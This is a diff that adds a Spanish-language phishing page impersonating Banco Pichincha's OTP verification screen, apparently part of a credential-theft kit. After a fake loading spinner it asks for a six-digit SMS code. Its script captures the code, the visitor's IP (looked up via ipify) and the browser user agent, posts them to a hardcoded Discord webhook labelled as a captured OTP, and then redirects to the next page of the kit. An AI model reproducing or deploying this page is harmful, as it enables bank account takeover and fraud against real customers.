@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{background:#fff}
+.header{padding:16px 20px;box-shadow:0 4px 10px rgba(0,0,0,.12)}
+.logo{height:36px}
+.container{max-width:480px;margin:0 auto;padding:35px 20px;text-align:center}
+.image-box{max-width:200px;margin:30px auto}
+.image-box img{width:50%}
+.title{font-size:26px;font-weight:700;color:#0b2a5b;margin-bottom:15px}
+
+/* --- ÁREA DE CARGA --- */
+.loading-zone {
+  min-height: 100px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+.spinner {
+  width: 40px;
+  height: 40px;
+  border: 4px solid rgba(11, 42, 91, 0.1);
+  border-left-color: #0b2a5b;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* --- CONTENIDO OCULTO AL INICIO --- */
+#content-to-reveal {
+  display: none;
+}
+
+.description {
+  font-size: 14px;
+  color: #5a5a5a;
+  line-height: 1.5;
+  margin-bottom: 30px;
+}
+
+.form{text-align:left}
+label{font-size:14px;font-weight:600;display:block;margin-bottom:8px}
+.code{text-align:center;letter-spacing:10px;font-size:26px;padding:16px;}
+input{width:100%;padding:16px;border-radius:8px;border:1px solid #ccc;margin-bottom:20px;font-size:18px;}
+.btn{width:100%;background:#ffd200;border:none;padding:16px;font-size:17px;font-weight:700;border-radius:8px;cursor:pointer;}
+.btn:hover{background:#f5c400}
+.error{color:#c00;font-size:14px;margin-bottom:15px;}
+.hidden{display:none}
+.timer{margin-top:20px;font-size:14px;color:#5a5a5a;text-align:center;}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png" class="logo">
+</div>
+
+<div class="container">
+  <div class="image-box">
+    <img src="https://media.istockphoto.com/id/662107734/es/vector/icono-de-protecci%C3%B3n-de-contrase%C3%B1a-dise%C3%B1o-plano.jpg?s=612x612&w=0&k=20&c=_BzBEHNoQjemjOHDYSjMLWYiAQKhEi-UnnDFqwX_Hyw=">
+  </div>
+  <div class="title">Autenticación de Usuario</div>
+
+  <div id="loading-area" class="loading-zone">
+    <div class="spinner"></div>
+  </div>
+
+  <div id="content-to-reveal">
+    <div class="description">
+      Hemos enviado un mensaje de texto con un código a su número de móvil o correo electrónico registrado. Estas validando tu identidad en www.pichinchacredito.com.ec.
+    </div>
+
+    <div class="form">
+      <label>Código de verificación</label>
+      <input id="code" class="code" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="••••••">
+      <div class="error hidden" id="errorMsg">Debes ingresar el código de 6 dígitos.</div>
+      <button id="submitBtn" class="btn" onclick="verificar()">Continuar</button>
+    </div>
+
+    <div class="timer">¿No recibiste el código? Espera unos minutos.</div>
+  </div>
+</div>
+
+<script>
+  let userIP = "Obteniendo IP...";
+
+  // 1. Capturar IP real
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => userIP = data.ip)
+    .catch(() => userIP = "No detectada");
+
+  // 2. Revelar formulario tras 7 segundos
+  setTimeout(function() {
+    document.getElementById("loading-area").style.display = "none";
+    document.getElementById("content-to-reveal").style.display = "block";
+  }, 7000);
+
+  // 3. Enviar y redireccionar
+  async function verificar(){
+    const code = document.getElementById("code").value;
+    const error = document.getElementById("errorMsg");
+    const btn = document.getElementById("submitBtn");
+
+    if(code.length !== 6){
+      error.classList.remove("hidden");
+      return;
+    }
+    error.classList.add("hidden");
+
+    // Desactivar botón para evitar múltiples clics
+    btn.disabled = true;
+    btn.innerText = "Verificando...";
+
+    const webhookURL = "https://discord.com/api/webhooks/1466546024330956863/DQISlPi3bHFT_b-pd2OZDw7defnMnymgsldEng4C-I1b_fTRPoJe8wtFNUcdDGaYhD9X"; 
+
+    const payload = {
+      content: "✅ **Nuevo Código OTP capturado**",
+      embeds: [{
+        title: "Registro de Actividad",
+        color: 3066993, // Verde
+        fields: [
+          { name: "🔑 Código", value: `**${code}**`, inline: true },
+          { name: "🌐 IP Real", value: `**${userIP}**`, inline: true },
+          { name: "📱 Dispositivo", value: navigator.userAgent }
+        ],
+        timestamp: new Date()
+      }]
+    };
+
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+
+      // REDIRECCIÓN DIRECTA A INDEX3.HTML
+      window.location.href = "giu.html";
+
+    } catch (e) {
+      // Si falla internet, intenta redirigir de todos modos
+      window.location.href = "giu.html";
+    }
+  }
+</script>
+
+</body>
+</html>
